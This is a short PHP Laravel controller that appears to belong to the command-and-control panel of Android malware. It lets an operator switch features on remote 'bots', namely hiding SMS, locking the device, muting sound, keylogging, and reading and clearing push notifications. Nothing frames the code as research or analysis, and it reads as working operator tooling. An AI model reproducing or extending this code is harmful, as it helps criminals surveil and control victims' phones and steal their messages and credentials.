<?php

namespace App\Http\Controllers\Api\v1\Bot;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Http\Resources\Bot\BotResource;
use App\Models\Bot;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;

class BotSettingsController extends Controller
{
    /**
     * @throws ValidationException
     */
    public function update(Bot $bot, Request $request): ApiResponse
    {
        $this->validate($request, [
            'type' => 'required|string|in:hideSMS,lockDevice,offSound,keylogger,clearPush,readPush',
            'value' => 'required|boolean',
        ]);

        $settings = $bot->settings;

        $settings[$request->get('type')] = $request->get('value') ? "1" : "0";

        $bot->update([
            'settings' => $settings,
            'update_settings' => true,
        ]);

        return ApiResponse::success(BotResource::make($bot));
    }
}
